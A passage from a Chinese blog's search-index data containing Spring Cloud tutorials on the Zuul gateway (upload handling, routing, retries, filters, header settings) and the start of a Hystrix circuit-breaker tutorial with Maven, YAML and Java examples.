String PREFIX_PATH = "/tmp/upload/"; private static final Logger logger = LoggerFactory.getLogger(UploadController.class); @PostMapping("/upload") @ApiOperation("文件上传接口") public String upload(@RequestParam(value = "file", required = true) MultipartFile file) throws Exception { logger.info("==&gt; file size: " + file.getSize()); byte[] bytes = file.getBytes(); String filePath = PREFIX_PATH + UUID.randomUUID().toString(); File fileToSave = new File(filePath); FileCopyUtils.copy(bytes, fileToSave); return filePath; }} 测试效果： 依次启动 eureka-server、zuul-server 应用 访问 http://127.0.0.1:8092/swagger-ui.html，选择本地文件进行上传即可 文件上传乱码在 Spring Cloud Finchley 之前的版本，上传中文名的文件会出现文件名乱码的情况，上传英文名的文件则不会，这是由于 Zuul 内部默认使用了 Spring MVC 来上传文件，这种方式对中文字符的处理有点不友好。如果要解决这个问题，可以改为使用 Zuul Servlet 来上传文件，当需要上传大文件的时候尤需如此，因为它自带有一个缓冲区。此时只需要在请求路径前加上 /zuul 就可以使用 Zuul Servlet 了，例如：http://127.0.0.1:8092/zuul/upload。 Zuul 实用技巧饥饿加载Zuul 内部默认使用 Ribbon 来调用远程服务，所以由于 Ribbon 的原因，在部署好所有应用组件之后，第一次经过 Zuul 的调用往往会去注册中心读取服务注册表，初始化 Ribbon 负载均衡信息，这是一种懒加载策略，但是这个过程是极其耗时的，尤其是服务过多的时候。为了避免这个问题，可以在启动 Zuul 的时候就饥饿加载应用程序上下文信息；开启饥饿加载只需添加以下配置即可： 1234zuul: ribbon: eager-load: enabled: true 请求体修改在客户端对 Zuul 发送 POST 请求之后，由于某些原因，在请求到下游服务之前，需要对请求体进行修改，常见的是对 form・data 参数的增减，对 application/json 的修改，对请求体做 Uppercase 等。在 Zuul 中可以很好地解决这种需求，只需要新增一个 PRE 类型的 Filter 对请求体进行修改。由于在 Zuul 中有 Filter (FormBodyWrapperFilter) 会对请求体做封装，因此在编写此 Filter 的时候应当把它的执行次序放在该 Filter 之后，为了稳妥起见，把 ModifyRequestEntityFilter 的次序设置为 PRE 类型 Filter 的最后一级。 12345678910111213141516171819202122232425262728293031323334public class ModifyRequestEntityFilter extends ZuulFilter { @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return PRE_DECORATION_FILTER_ORDER + 1; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { RequestContext ctx = RequestContext.getCurrentContext(); HttpServletRequest request = ctx.getRequest(); request.getParameterMap(); Map&lt;String, List&lt;String&gt;&gt; requestQueryParams = ctx.getRequestQueryParams(); if (requestQueryParams == null){ requestQueryParams = new HashMap&lt;&gt;(); } //这里添加新增参数的value，注意，只取list的0位 ArrayList&lt;String&gt; arrayList = new ArrayList&lt;&gt;(); arrayList.add("wwww"); requestQueryParams.put("test", arrayList); ctx.setRequestQueryParams(requestQueryParams); return null; }} 重试机制在 Spring Cloud 中有多种发送 HTTP 请求的方式可以与 Zuul 结合，RestTemplate、Ribbon 或者 Feign，但是无论选择哪种，都可能出现请求失败的情况，这在复杂的互联网环境是不可避免的。Zuul 作为一个网关中间件，在出现偶然请求失败时进行适当的重试是十分必要的，重试可以有效地避免一些突发原因引起的请求丢失。Zuul 中的重试机制是配合 Spring Retry 与 Ribbon 来使用的。 在 pom.xml 引入 Spring Retry 的依赖包： 1234&lt;dependency&gt; &lt;groupld&gt;org.springframework.retry&lt;/groupld&gt; &lt;artifactld&gt;spring-retry&lt;/artifactld&gt;&lt;/dependency&gt; 在 application.yml 里添加重试相关的配置内容： 123456789101112131415161718#Zuul开启重试，D版之后默认为false，需要手动开启zuul: retryable: true#Ribbon的重试机制配置ribbon: ConnectTimeout: 3000 ReadTimeout: 60000 MaxAutoRetries: 1 #对第一次请求的服务的重试次数 MaxAutoRetriesNextServer: 1 #要重试的下一个服务的最大数量（不包括第一个服务） OkToRetryOnAllOperations: true#SpringCloud内部默认已开启负载均衡重试，这里列出来说明这个参数比较重要spring: cloud: loadbalancer: retry: enabled: true 配置当中的 ConnectTimeout 与 ReadTimeou 是当 HTTP 客户端使用 Apache HttpClient 的时候生效的，这个超时时间最终会被设置到 Apache HttpClient 中去。在设置的时候要结合 Hystrix 的超时时间来综合考虑，针对不同的应用场景，设置太小会导致很多请求失败，设置太大会导致熔断功能控制性变差，所以需要经过压力测试得来。Zuul 同时也支持对单个映射规则进行重试 zuul.routes.&lt;route&gt;.retryable=true，需要注意的是，在某些对幂等要求比较高的使用场景下，要慎用重试机制，因为如果没有相关处理的话，出现幂等问题是十分有可能的。 Header 传递在 Zuul 中对请求做了一些处理，需要把处理结果发给下游服务，但是又不能影响请求体的原始特性，这个问题该怎么解决好呢？Zuul 提供了一个重要的类 Requestcontext，里面的 addZuulRequestHeader() 方法正好可以用来解决此问题，官方称之为 Header 的传递。 123456789101112131415161718192021222324public class HeaderDeliverFilter extends ZuulFilter { @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return PRE_DECORATION_FILTER_ORDER + 1; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { RequestContext context = RequestContext.getCurrentContext(); context.addZuulRequestHeader("result", "to next service"); return null; }} 使用 OkHttp 替换 Apache HttpClient在 Spring Cloud 中各个组件之间使用的通信协议都是 HTTP，而 HTTP 客户端使用的是 Apache HttpClient，但是由于其难以扩展等诸多原因，已被许多技术栈弃用。 Square 公司开发的 okhttp 正在逐渐被接受，在 Zuul 中使用 okhttp 替换 Apache HttpClient，首先需要在 pom.xml 中增加 okhttp 的依赖包： 1234&lt;dependency&gt; &lt;groupld&gt;com.squareup.okhttp3&lt;/groupld&gt; &lt;artifactId&gt;okhttp&lt;/artifactId&gt;&lt;/dependency&gt; 然后在 application.yml 文件中禁用 HttpClient 并开启 okhttp 即可： 12345ribbon: httpclient: enabled: false okhttp: enabled: true 下篇 - Zuul 入门教程（高级篇） Zuul 入门教程 - 高级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Zuul 入门教程 - 基础篇",url:"/posts/316633c.html",text:'Zuul 介绍Zuul 是什么Zuul 是由 Netflix 孵化的一个致力于 “网关” 解决方案的开源组件，在动态路由、监控、弹性、服务治理以及安全方面起着举足轻重的作用。从 2012 年 3 月以来，陆续发布了 Zuul 1.0 与 Zuul 2.0 版本，后经 Pivotal 公司将 Zuul 1.0 整合到 Spring Cloud 的生态系统中，即现在的 Spring Cloud Zuul。在 Netflix 官方的解释中，Zuul 是从设备和网站到后端应用程序所有请求的前门，为内部服务提供可配置的对外 URL 到服务的映射关系，基于 JVM 的后端路由器。其底层基于 Servlet 实现，本质组件是一系列 Filter 所构成的责任链，并且 Zuul 的逻辑引擎与 Filter 可用其他基于 JVM 的编程语言编写（比如 Groovy）。Zuul 默认集成了 Ribbon、Hystrix，其中 Zuul 2.x 版本改动相较 1.x 比较大，底层使用了 Netty。虽然 Netflix 已经在 2018 年 5 月开源了 Zuul 2.x，但由于 Zuul 2.x 在 Spring Cloud Gateway 孵化之前一直跳票发布，而且 Spring Cloud Gateway 目前已经孵化成功，相较于 Zuul 1.x 在功能以及性能上都有明显的提升。因此在 Spring Boot 2.0 以上版本中，并没有对 Zuul 2.0 以上最新高性能版本进行集成，仍然使用 Zuul 1.x 非 Reactor 模式（基于 Servlet 2.5 阻塞架构）的旧版本。更多介绍可参考：Zuul 项目、Zuul 官方英文教程、Spring Cloud Zuul 官方中文文档 Zuul 的特性主要特性包括：认证和鉴权、压力控制、动态路由、负载削减、静态响应处理、主动流量管理、金丝雀测试 Zuul 1.x 与 Zuul 2.x 对比Zuul 1.x 是一个基于 Servlet 2.5 的同步阻塞 I/O 网关，不支持任何长连接（如 WebSocket）。Zuul 1.x 的设计和 Nginx 比较像，每次 I/O 操作都是从工作线程池中选择一个来执行，请求线程被阻塞到工作线程完成为止；但是差别是 Nginx 是基于 C/C++ 实现，而 Zuul 1.x 是使用 Java 实现，而 JVM 本身会有第一次加载较慢的情况，使得 Zuul 1.x 的性能相对较差。根据官方提供的基准测试，Spring Cloud Gateway 的 RPS（每秒请求数）是 Zuul 1.x 的 1.6 倍，平均延迟是 Zuul 1.x 的一半。 Zuul 2.x 的理念更先进，基于 Netty 的异步非阻塞 I/O 模型，支持长连接。Zuul 2.x 最大的改进就是基于 Netty Server 实现了异步非阻塞 I/O 来接入请求，同时基于 Netty Client 实现了到后端业务服务 API 的请求，这样就可以实现更高的性能、更低的延迟。此外也调整了 Filter 类型，将原来的三个核心 Filter 显式命名为：Inbound Filter、Endpoint Filter 和 Outbound Filter。值得一提的是，Zuul 2.x 与 Spring Cloud Gateway 的性能差不多。Zuul 2.x 的核心功能如下： GZip HTTP/2 Retries Mutual TLS WebSocket/SSE Proxy Protocol Load Balancing Request Passport Request Attempts Status Categories Service Discovery Connection Pooling Origin Concurrency Protection Zuul 入门案例这里的案例将使用到的 Spring Cloud 组件是 Eureka 与 Zuul，另外再使用一个普通服务作为 Zuul 路由的下级服务，来模拟真实开发中的一次路由过程。 1. 版本说明在本文中，默认使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，Zuul 版本是 1.x，点击下载完整的案例代码 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. 创建 Eureka Server 工程创建 Eureka Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Eureka Server 的启动主类，这里添加相应注解，作为程序的入口： 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} 添加 Eureka Server 需要的 application.yml 配置文件到工程中 1234567891011server: port: 8090eureka: instance: hostname: 127.0.0.1 client: registerWithEureka: false fetchRegistry: false serviceUrl: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. 创建 Provider 下游服务工程创建 Provider 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-netflix-eureka-client 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Provider 的启动主类，添加注解 @EnableDiscoveryClient，将服务注册到 Eureka Server： 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args){ SpringApplication.run(ProviderApplication.class, args); }} 在 application.yml 文件中指定服务名称（provider-service）、注册中心地址与端口号： 12345678910111213server: port: 9090spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 创建用于测试的 Controller 类： 12345678@RestControllerpublic class ProviderController { @GetMapping("/provider/add") public String add(Integer a, Integer b, HttpServletRequest request) { return "From Port: " + request.getServerPort() + ", Result: " + (a + b); }} 5. 创建 Zuul Server 工程创建 Zuul Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-netflix-eureka-client、spring-cloud-starter-netflix-zuul 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Zuul Server 的启动主类，添加注解 @EnableZuulProxy、@EnableDiscoveryClient 123456789@EnableZuulProxy@EnableDiscoveryClient@SpringBootApplicationpublic class ZuulServerApplication { public static void main(String[] args) { SpringApplication.run(ZuulServerApplication.class, args); }} 在 application.yml 文件中指定服务名称（zuul-server）、注册中心地址与端口号： 1234567891011121314151617181920server: port: 8092spring: application: name: zuul-servereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true#路由映射规则zuul: routes: provider-service: path: /provider/service/** serviceId: provider-service 6. 测试效果 分别启动 eureka-server、provider-service、zuul-server 应用 访问 provider-service 应用：http://127.0.0.1:9090/provider/add?a=3&amp;b=5 方式一：通过 zuul-server 访问 provider-service 应用：http://127.0.0.1:8092/provider-service/provider/add?a=3&amp;b=5，provider-service 为服务实例的名称 方式二：通过 zuul-server 访问 provider-service 应用：http://127.0.0.1:8092/provider/service/provider/add?a=3&amp;b=6，这里使用了路由映射规则 /provider/service/** 若上面通过 zuul-server 访问 provider-service 应用后，都可以正常返回结果，则说明 Zuul 成功发挥了网关的作用提示：若在 Zuul 的配置文件中指定了路由映射规则，当向 Zuul Server 发起请求的时候，Zuul 会去 Eureka 注册中心拉取服务列表，如果发现有指定的路由映射规则，就会按照映射规则路由到相应的服务接口 Zuul 路由配置路由配置简化12345zuul: routes: client-a: path: /client/** serviceId: client-a 上述的配置中，是一个从 /client/** 路由到 client-a 服务的一个映射规则，它可以简化成如下的简单配置，在这种情况下，Zull 会为 client-a 服务添加一个默认的映射规则 /client/** 123zuul: routes: client-a: /client/** 单实例 URL 映射除了路由到服务外，还支持路由到物理笛子，将 serviceId 替换为 url 即可： 12345zuul: routes: client-a: path: /client/** serviceId: http://127.0.0.1:8080 多实例路由映射在默认情况下，Zuul 会使用 Eureka 中集成的负载均衡功能，如果想要使用 Ribbon 的客户端负载均衡功能，就需要指定一个 serviceId，此操作需要禁止 Ribbon 使用 Eureka。提示：Spring Cloud 在 E 版本之后，新增了负载均衡策略的配置： 123456789101112131415zuul: routes: client-a: path: /ribbon/** serviceId: client-aribbon: eureka: enabled: falseclient-a: ribbon: NIWSServerListClassName: com.netflix.loadbalancer.ConfigurationBasedServerList NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RoundRobinRule listOfServers: 127.0.0.1:8001,127.0.0.1:8002 Forward 本地跳转在 Zuul 中有时候会做一些逻辑处理，先在网关（Zuul Server）中写好一个接口，如下： 12345678@RestControllerpublic class TestController { @GetMapping("/add") public String add(Integer a, Integer b){ return "本地跳转: " + (a + b); }} 如果希望在访问 /provider/service 接口的时候，跳转到上面的 add 方法上来处理，就需要用到 Zuul 的本地跳转，配置如下： 12345zuul: routes: provider-service: path: /provider/service/** url: forward:/add 当访问 http://127.0.0.1:8092/provider/service?a=2&amp;b=3，会跳转到 TestController 类的 add 本地方法 相同路径的加载规则有一种特殊的情况，为一个映射路径指定多个 serviceId 时，那么 Zuul 总是会路由到 YML 配置文件中最后面的那个服务。即在 YML 解释器工作的时候，如果同一个映射路径对应多个服务，按照加载顺序，最后加载的映射规则会把之前的映射规则覆盖掉。 12345678zuul: routes: client-a: path: /client/** serviceId: client-a client-b: path: /client/** serviceId: client-b 路由通配符此外，映射路径 /client/** 之后的 /** 也大有讲究，其还可以配置为 /* 或者 /?，具体规则如下： Zuul 功能配置路由前缀在配置路由规则的时候，可以配置一个统一的代理前缀，下次通过 Zuul 访问后端接口的时候就需要加上这个后缀了。提示，请求路径会变成 /pre/client/add，但实际起作用的是 /client/add，可以使用 stripPrefix=false 来关闭此功能；关闭之后，请求路径是 /pre/client/add，实际起作用的还是 /pre/client/add，一般不推荐使用这个配置。 1234567zuul: prefix: /pre routes: client-a: path: /client/** serviceId: client-a stripPrefix: false 敏感头信息在构建系统的时候，使用 HTTP 的 header 传值是十分方便的，协议的一些认证信息默认也在 header 里，比如 Cookie，或者习惯把基本认证信息通过 BASE64 加密后放在 Authorization 里面，但是如果系统要和外部系统通信，就可能会出现这些信息的泄漏。Zuul 支持在配置文件里面指定敏感头，切断它和下层服务之间的交互，配置如下： 123456zuul: routes: client-a: path: /client/** serviceId: client-a sensitiveHeaders: Cookie,Set-Cookie,Authorization 重定向问题假设客户端通过 Zuul 请求认证服务，认证成功之后重定向到一个欢迎页面，但是发现重定向的这个欢迎页面的 host 变成了这个认证服务的 host，而不是 Zuul 的 host，直接导致了认证服务地址的暴露（如下图），此时可以使用下述配置来解决： 123456zuul: add-host-header: true #解决重定向的header问题 routes: client-a: path: /client/** serviceId: client-a 服务屏蔽与路径屏蔽有时候为了避免某些服务或者路径的侵入，加入 ignored-services 与 ignored-patterns 之后，可以将它们屏蔽掉： 1234567zuul: ignored-services: client-b #忽略的服务，防服务侵入 ignored-patterns: /**/div/** #忽略的接口，屏蔽接口 routes: client-a: path: /client/** serviceId: client-a 下篇 - Zuul 入门教程（中级篇） Zuul 入门教程 - 中级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Hystrix 入门教程 - 基础篇",url:"/posts/2ed0fea6.html",text:'服务雪崩效应服务雪崩概述微服务之间进行 RPC 或者 HTTP 调用时，一般都会设置 调用超时，失败重试等机制来确保服务的成功执行，这看上去很美好，但如果不考虑服务的熔断和限流，它就是造成服务雪崩的元凶。假设有两个访问量比较大的服务 A 和 B，这两个服务分别依赖 C 和 D，其中 C 和 D 服务都依赖 E 服务（如下图），这就是所谓的扇出。A 和 B 不断地调用 C 和 D，处理客户请求和返回需要的数据；当 E 服务不能提供服务的时候，C 和 D 的 超时和重试机制会被执行；由于新的请求不断的产生，会导致 C 和 D 对 E 服务的调用大量的积压，产生大量的调用等待和重试调用，会慢慢耗尽 C 和 D 的系统资源（CPU 或者内存等），然后 C 和 D 服务跟着也 down 掉。A 和 B 服务会重复 C 和 D 的遭遇，导致系统资源耗尽，然后服务也 down 掉了，最终整个服务都不可访问，造成了服务雪崩。 服务雪崩原因分析 访问量的突然激增 硬件故障，如机器宕机，机房断电，光纤被挖断等 数据库存在严重瓶颈，如：长事务、SQL 查询超时等 缓存击穿，导致请求全部落到某个服务，导致服务宕掉 程序有 Bug，导致服务不可用或者运行缓慢，如内存泄漏、线程同步等待等 服务雪崩解决方案 隔离：将不同类型的接口隔离部署，单个类型接口的失败甚至进程池被耗尽了，也不会影响其他接口的正常访问 限流：当发现服务失败数量达到某个阈值，拒绝访问，以此限制更多流量进来，防止过多失败的请求将资源耗尽 熔断：从接口请求连接时就拒绝访问，类似家里用的保险丝，当使用的电器总和超过了电压就熔断保险丝，保护整个区域的电路防止更多的损失 降级：对于简单的展示功能，如果有失败的请求，返回默认值；对于整个站点或客户端，如果服务器负载过高，则将其他非核心业务停掉，以让出更多资源给其他服务使用 熔断与降级的区别熔断与降级的相同点： 最终表现类似，对于两者来说，最终让用户体验到的是某些功能暂时不可达或不可用 目的很一致，都是从可用性可靠性着想，为防止系统的整体缓慢甚至崩溃而采用的技术手段 粒度一般都是服务级别，当然，业界也有不少更细粒度的做法，比如做到数据持久层（允许查询，不允许增删改） 自治性要求很高，熔断模式一般都是服务基于策略的自动触发，降级虽说可人工干预，但在微服务架构下，完全靠人显然不可能，开关预置、配置中心都是必要手段 熔断与降级的不同点： 实现方式不太一样，降级具有代码侵入性 (由控制器完成或者自动降级)，熔断一般称为自我熔断 触发原因不太一样，服务熔断一般是某个服务（下游服务）故障引起，而服务降级一般是从整体负荷考虑 管理目标的层次不太一样，熔断其实是一个框架级的处理，每个微服务都需要（无层级之分），而降级一般需要对业务有层级之分（比如降级一般是从最外围服务开始） 资源隔离的级别 应用级别隔离：线程池隔离、信号量隔离、连接池隔离；Hystrix 实现了前两种，其各自优缺点如下图： 硬件级别隔离：虚拟机、Docker，比如 Docker 的资源隔离和资源限制，其通过 CGroup 来控制容器使用的资源配额，包括 CPU、内存、磁盘 IO、网络 Hystrix 介绍Hystrix 是什么Hystrix 是由 Netflix 开源的一个针对分布式系统容错处理的开源组件，2011 - 2012 年相继诞生和成熟，在 2018 年 11 月 20 日之后已经停止维护，最后一个正式版本为 1.5.18。Hystrix 单词意为 “豪猪”，浑身有刺保护自己，Hystrix 就是这样一个用来捍卫应用程序健康的利器。进一步说，Hystrix 是一个延迟和容错库，用在隔离远程系统、服务和第三方库，阻止级连故障，在复杂的分布式系统中实现恢复能力，以提高分布式系统的弹性。Hystrix 底层大量使用了 RxJava，而 Spring Cloud Hystrix 对 Hystrix 进行了二次封装，将其整合进 Spring Cloud 生态，更多介绍可参考：Hystrix 项目、Hystrix 官方英文教程、Spring Cloud Hystrix 官方中文文档 Hystrix 的设计目标 通过客户端库对延迟和故障进行保护和控制 在一个复杂的分布式系统中停止级联故障 快速失败和迅速恢复 在合理的情况下回退和优雅地降级 开启近实时监控、告警和操作控制 Hystrix 的特性服务熔断熔断机制是应对服务雪崩效应的一种微服务链路保护机制。日常在各种场景下都会接触到熔断这两个字，高压电路中，如果某个地方的电压过高，熔断器就会熔断，对电路进行保护。股票交易中，如果股票指数过高，也会采用熔断机制，暂停股票的交易。同样，在微服务架构中，熔断机制也是起着类似的作用。当扇出链路的某个微服务不可用或者响应时间太长时，会进行服务的降级，进而熔断该节点微服务的调用，快速返回” 错误” 的响应信息。当检测到该节点微服务调用响应正常后恢复调用链路。在 Spring Cloud 框架里熔断机制通过 Hystrix 实现，Hystrix 会监控微服务间调用的状况，当失败的调用到一定阈值，缺省是 5 秒内 20 次调用失败就会启动熔断机制。服务熔断是在服务端（服务提供者）实现的，Hybstrix 熔断机制的注解是 @HystrixCommand。 服务降级服务压力剧增的时候，根据当前的业务情况及流量对一些服务和页面有策略的降级，缓解服务器的压力，以保证核心任务的进行，同时保证部分甚至大部分请求能得到正确的响应。也就是当前的请求处理不了或者出错了，给一个默认的返回结果。服务降级处理是在客户端（服务消费者）实现的，与服务端（服务提供者）没有关系。 准实时的调用监控Hystrix 除了隔离依赖服务的调用以外，还提供了准实时的调用监控（Hystrix Dashboard）。Hystrix 会持续地记录所有通过 Hystrix 发起的请求的执行信息，并以统计报表和图形的形式展示给用户，包括每秒执行多少请求、多少成功、多少失败等。Netflix 通过 hystrix-metrics-event-stream 项目实现了对以上指标的监控，而 Spring Cloud 也提供了 Hystrix Dashboard 的整合，对监控内容转化成可视化界面。 Hystrix 入门案例1. 版本说明在下面的的教程中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，点击下载完整的案例代码 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. 创建 Eureka Server 工程创建 Eureka Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Eureka Server 的启动主类，这里添加相应注解，作为程序的入口： 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} 添加 Eureka Server 需要的 application.yml 配置文件到工程中 1234567891011server: port: 8090eureka: instance: hostname: 127.0.0.1 client: registerWithEureka: false fetchRegistry: false serviceUrl: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. 创建 Provider 源服务工程创建 Provider 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-netflix-hystrix、spring-cloud-starter-netflix-eureka-client 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Provider 的启动主类，添加注解 @EnableHystrix、@EnableDiscoveryClient 123456789@EnableHystrix@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} 在 application.yml 文件中指定服务名称（provider）、注册中心地址与端口号： 12345678910111213server: port: 8080spring: application: name: providereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 创建用于测试的 Controller 类： 123456789101112131415161718@RestController@RequestMapping("/user")public class UserController { @GetMapping("/getUser") @HystrixCommand(fallbackMethod = "defaultUser") public String getUser(String userName) { if (userName.equals("Jim")) { return "this is real user"; } else { throw new RuntimeException("user is not exist"); } } public String defaultUser(String userName) { return "the user not exist in this system"; }} 5. 测试 启动 Eureka Server 与 Provider 应用 浏览器访问 http://127.0.0.1:8080/user/getUser?userName=Jim，当用户名为 Jim 时会返回正确的信息 当用户名不为 Jim 时，则会抛出运行时异常，同时 Hystrix 会降级处理返回友好的提示 Hystrix 实战应用Feign 中使用 Hystrix在 Feign 中，默认是自带 Hystrix 功能的，在很老的版本中默认是打开的，从最近的几个版本开始默认被关闭了，因此需要通过配置文件打开它，点击下载完整的案例代码。 在 Provider 源服务工程里，创建用于测试的 Controller 类： 123456789@RestController@RequestMapping("/dept")public class DeptController { @RequestMapping("/getDept") public String getDept(String deptName) { throw new RuntimeException("dept is not exist"); }} 创建 Feign Client 工程，使用 @FeignClient 定义接口，并配置降级回退类： 123456@FeignClient(name = "PROVIDER", fallbackFactory = DeptClientFallbackServiceFactory.class)public interface DeptClientService { @RequestMapping("/dept/getDept") public String getDept(@RequestParam("deptName") String deptName);} 在 Feign Client 工程里，创建降级回退类，实现 FallbackFactory 接口： 